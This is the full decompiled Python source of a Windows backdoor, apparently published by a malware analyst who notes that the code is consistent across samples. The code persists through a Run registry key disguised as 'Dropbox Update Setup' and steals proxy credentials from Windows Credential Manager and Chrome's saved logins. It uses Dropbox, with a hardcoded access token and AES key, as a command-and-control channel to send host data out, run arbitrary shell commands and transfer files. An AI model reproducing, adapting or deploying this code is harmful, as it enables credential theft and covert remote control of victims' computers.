# The decompiled Python code is consistent among all the samples. The only change we observed was in the access token. Even the AES encryption key is shared between all the samples.

 

import requests, json, win32cred, sqlite3, win32crypt, subprocess, sys, os, threading, time, platform, uuid, base64, time

from Crypto import Random

from Crypto.Cipher import AES

from _winreg import *

time.sleep(480)

access_token = 'XAdmrYKoIiAAAAAAAAAADSEB3W3JCY6-pc1tD0zTp2upliDsO9vNrjfjIDJae_Ii'

api_url = 'https://api.dropboxapi.com/2/files/'

content_url = 'https://content.dropboxapi.com/2/files/'

respath = '/res'

jobpath = '/job'

respath_s = '/res/'

jobpath_s = '/job/'

proxies = {}

uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))

BS = 16

pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

unpad = lambda s: s[0:-ord(s[(-1)])]

 

class AESCipher:

 

    def __init__(self):

        self.key = 'ApmcJue1570368JnxBdGetr*^#ajLsOw'

 

    def encrypt(self, raw):

        raw = pad(raw)

        iv = Random.new().read(AES.block_size)

        cipher = AES.new(self.key, AES.MODE_CBC, iv)

        return base64.b64encode(iv + cipher.encrypt(raw))

 

    def decrypt(self, enc):

        enc = base64.b64decode(enc)

        iv = enc[:16]

        cipher = AES.new(self.key, AES.MODE_CBC, iv)

        return unpad(cipher.decrypt(enc[16:]))

 

 

aesciper = AESCipher()

 

class regthread(threading.Thread):

 

    def __init__(self):

        threading.Thread.__init__(self)

        self.tempdir = os.getenv('AppData')

        self.fileName = sys.argv[0]

        self.regpath = os.path.join(self.tempdir, os.path.basename(self.fileName))

        self.runs = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'

        self.services = 'Dropbox Update Setup'

        self.daemon = False

        self.start()

 

    def run(self):

        os.popen('copy %s %s /y' % (self.fileName, self.tempdir))

        key = OpenKey(HKEY_CURRENT_USER, self.runs)

        while True:

            runkey = []

            try:

                i = 0

                while True:

                    subkey = EnumValue(key, i)

                    runkey.append(subkey[0])

                    i += 1

 

            except Exception as e:

                pass

 

            if self.services not in runkey:

                time.sleep(10)

                try:

                    key = OpenKey(HKEY_CURRENT_USER, self.runs, 0, KEY_ALL_ACCESS)

                    SetValueEx(key, self.services, 0, REG_SZ, self.regpath)

                    key.Close()

                except Exception as e:

                    pass

 

            time.sleep(10)

 

 

def get_proxyserver():

    try:

        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)

        aKey = OpenKey(aReg, 'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings')

        subCount, valueCount, lastModified = QueryInfoKey(aKey)

        for i in range(valueCount):

            n, v, t = EnumValue(aKey, i)

            if n == 'ProxyServer':

                if ';' in v:

                    slist = v.split(';')

                    for i in slist:

                        if 'http=' in i:

                            server = i.split('=')[1]

                        else:

                            server = ''

 

                elif '=' in v:

                    server = v.split('=')[1]

                else:

                    server = v

 

        CloseKey(aKey)

        return server

    except Exception as e:

        return ''

 

    return

 

 

def check_proxy():

    try:

        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)

        aKey = OpenKey(aReg, 'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings')

        subCount, valueCount, lastModified = QueryInfoKey(aKey)

        for i in range(valueCount):

            n, v, t = EnumValue(aKey, i)

            if n == 'ProxyEnable':

                isproxy = v

 

        CloseKey(aKey)

        return isproxy

    except Exception as e:

        return 0

 

    return

 

 

def get_ie_creds(server):

    proxycreds = []

    if ':' in server:

        server = server.split(':')[0]

    try:

        creds = win32cred.CredEnumerate(None, 1)

        for i in creds:

            if server in i['TargetName']:

                user = i['UserName']

                passwd = i['CredentialBlob'].replace('\x00', '')

                dic = {user: passwd}

                proxycreds.append(dic)

 

        return proxycreds

    except Exception as e:

        return proxycreds

 

    return

 

 

def get_chrome_creds(server):

    path = os.getenv('APPDATA') + '\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'

    creds = []

    if ':' in server:

        server = server.split(':')[0]

    try:

        conn = sqlite3.connect(path)

        cursor = conn.cursor()

        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        data = cursor.fetchall()

        if len(data) > 0:

            for result in data:

                if result[0] == server:

                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]

                    if password:

                        dic = {result[1]: password}

                        creds.append(dic)

 

        return creds

    except Exception as e:

        return creds

 

    return

 

 

def check_cred(server, creds):

    global proxies

    pro = {}

    url = 'https://www.dropbox.com'

    if server:

        if creds:

            for userdic in creds:

                for user in userdic:

                    pro['http'] = 'http://' + user + ':' + userdic[user] + '@' + server

                    pro['https'] = 'https://' + user + ':' + userdic[user] + '@' + server

                    r = requests.get(url, proxies=pro)

                    if r.status_code == 200:

                        proxies = pro

                        return 1

 

        else:

            pro['http'] = 'http://' + server

            pro['https'] = 'https://' + server

            r = requests.get(url, proxies=pro)

            if r.status_code == 200:

                proxies = pro

                return 1

    return 0

 

 

def do_post(url, headers, data, proxy):

    if proxy:

        r = requests.post(url, headers=headers, data=data, proxies=proxies)

        if 'download' in url:

            return r.content

        if 'upload' in url:

            return r.content

        return json.loads(r.content)

    else:

        r = requests.post(url, headers=headers, data=data)

        if 'download' in url:

            return r.content

        if 'upload' in url:

            return r.content

        return json.loads(r.content)

 

 

def search(path, query, proxy):

    headers = {'Authorization': 'Bearer ' + access_token,

       'Content-Type': 'application/json'}

    data = {'path': path,

       'query': query,

       'mode': {'.tag': 'filename'}}

    r = do_post(api_url + 'search', headers, json.dumps(data), proxy)

    return r

 

 

def download(filepath, proxy):

    headers = {'Authorization': 'Bearer ' + access_token,

       'Dropbox-API-Arg': '{"path":"%s"}' % filepath}

    r = do_post(content_url + 'download', headers, '', proxy)

    return r

 

 

def upload(data, filepath, proxy):

    headers = {'Authorization': 'Bearer ' + access_token,

       'Content-Type': 'application/octet-stream',

       'Dropbox-API-Arg': '{"path":"%s"}' % filepath}

    r = do_post(content_url + 'upload', headers, data, proxy)

    return r

 

 

def delete(filepath, proxy):

    headers = {'Authorization': 'Bearer XAdmrYKoIiAAAAAAAAAADSEB3W3JCY6-pc1tD0zTp2upliDsO9vNrjfjIDJae_Ii',

       'Content-Type': 'application/json'}

    data = {'path': filepath}

    r = do_post(api_url + 'delete', headers, json.dumps(data), proxy)

    return r

 

 

class Download(threading.Thread):

 

    def __init__(self, jobid, filepath, proxy):

        threading.Thread.__init__(self)

        self.jobid = jobid

        self.filepath = filepath

        self.daemon = True

        self.proxy = proxy

        self.start()

 

    def run(self):

        try:

            if os.path.exists(self.filepath) is True:

                Sendmsg({u'cmd': u'download', u'res': u'Download file success...'}, self.proxy, self.jobid, self.filepath)

            else:

                Sendmsg({u'cmd': u'download', u'res': u'Path to file invalid'}, self.proxy, self.jobid)

        except Exception as e:

            Sendmsg({u'cmd': u'download', u'res': (u'Failed: {}').format(e)}, self.proxy, self.jobid)

 

 

class Upload(threading.Thread):

 

    def __init__(self, jobid, dest, attachment, proxy):

        threading.Thread.__init__(self)

        self.jobid = jobid

        self.dest = dest

        self.attachment = attachment

        self.daemon = True

        self.proxy = proxy

        self.start()

 

    def run(self):

        try:

            file_content = download(jobpath_s + self.attachment, self.proxy)

            fopen = open(self.dest, 'wb+')

            fopen.write(file_content)

            fopen.close()

            Sendmsg({u'cmd': u'upload', u'res': u'Upload file success ,saved to %s' % self.dest}, self.proxy, self.jobid)

        except Exception as e:

            Sendmsg({u'cmd': u'upload', u'res': (u'Upload file Failed: {}').format(e)}, self.proxy, self.jobid)

 

 

class execCmd(threading.Thread):

 

    def __init__(self, command, jobid, proxy):

        threading.Thread.__init__(self)

        self.command = command

        self.jobid = jobid

        self.daemon = True

        self.proxy = proxy

        self.start()

 

    def run(self):

        try:

            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            stdout_value = unicode(proc.stdout.read(), errors='ignore')

            stdout_value += unicode(proc.stderr.read(), errors='ignore')

            Sendmsg({'cmd': self.command, 'res': stdout_value}, self.proxy, jobid=self.jobid)

        except Exception as e:

            pass

 

 

def getdate():

    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

 

 

def getUser():

    return os.environ.get('USERNAME')

 

 

def getComputername():

    return os.environ.get('COMPUTERNAME')

 

 

def getSysinfo():

    return ('{}-{}').format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])

 

 

def uploadfiles(filename, proxy):

    try:

        if search(respath, os.path.basename(filename), proxy)['matches']:

            delete(respath_s + os.path.basename(filename), proxy)

        fopen = open(filename, 'rb').read()

        upload(fopen, respath_s + os.path.basename(filename), proxy)

    except Exception as e:

        pass

 

 

def msgparse(path, proxy):

    try:

        msg = download(path, proxy)

        return json.loads(aesciper.decrypt(msg))

    except Exception as e:

        return False

 

 

class Sendmsg(threading.Thread):

 

    def __init__(self, text, proxy, jobid='', attachment=''):

        threading.Thread.__init__(self)

        self.text = text

        self.jobid = jobid

        self.attachment = attachment

        self.proxy = proxy

        self.daemon = True

        self.start()

 

    def run(self):

        filename = uniqueid

        filename = (u'back#{}#{}#.txt').format(uniqueid, self.jobid)

        file_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser(), u'file': self.attachment, u'msg': self.text})

        if self.attachment:

            if os.path.exists(self.attachment) == True:

                file_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser(), u'file': os.path.basename(self.attachment), u'msg': self.text})

                uploadfiles(self.attachment, self.proxy)

        while True:

            try:

                if search(respath, filename, self.proxy)['matches']:

                    delete(respath_s + filename, self.proxy)

                upload(aesciper.encrypt(file_content), respath_s + filename, self.proxy)

                break

            except Exception as e:

                time.sleep(10)

 

 

def checkJobs(proxy):

    while True:

        try:

            joblist = search(jobpath, uniqueid, proxy)

            for job in joblist['matches']:

                msg = msgparse(job['metadata']['path_lower'], proxy)

                jobid = job['metadata']['path_lower'].split('#')[2]

                if msg:

                    cmd = msg['cmd']

                    arg = msg['arg']

                    if cmd == 'download':

                        Download(jobid, arg, proxy)

                    elif cmd == 'upload':

                        Upload(jobid, arg, msg['file'], proxy)

                    elif cmd == 'cmd':

                        execCmd(arg, jobid, proxy)

                try:

                    delete(job['metadata']['path_lower'], proxy)

                except Exception as e:

                    pass

 

            time.sleep(10)

        except Exception as e:

            time.sleep(10)

 

 

def call_online(proxy):

    info = {u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser()}

    filename = ('online#{}#.txt').format(uniqueid)

    file_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser(), u'msg': info})

    while True:

        try:

            if search(respath, filename, proxy)['matches']:

                delete(respath_s + filename, proxy)

            upload(aesciper.encrypt(file_content), respath_s + filename, proxy)

            break

        except Exception as e:

            time.sleep(10)

 

 

def startbot(proxy):

    regthread()

    call_online(proxy)

    try:

        checkJobs(proxy)

    except Exception as e:

        pass

 

 

if __name__ == '__main__':

    isproxy = check_proxy()

    if isproxy:

        try:

            server = get_proxyserver()

            ie_creds = get_ie_creds(server)

            if ie_creds:

                flag = check_cred(server, ie_creds)

                if flag:

                    startbot(isproxy)

                else:

                    startbot(not isproxy)

            else:

                chrome_creds = get_ie_creds(server)

                if chrome_creds:

                    flag = check_cred(server, chrome_creds)

                    if flag:

                        startbot(isproxy)

                    else:

                        startbot(not isproxy)

                else:

                    flag = check_cred(server, [])

                    if flag:

                        startbot(isproxy)

                    else:

                        startbot(not isproxy)

        except Exception as e:

            startbot(0)

 

    else:

        startbot(isproxy)
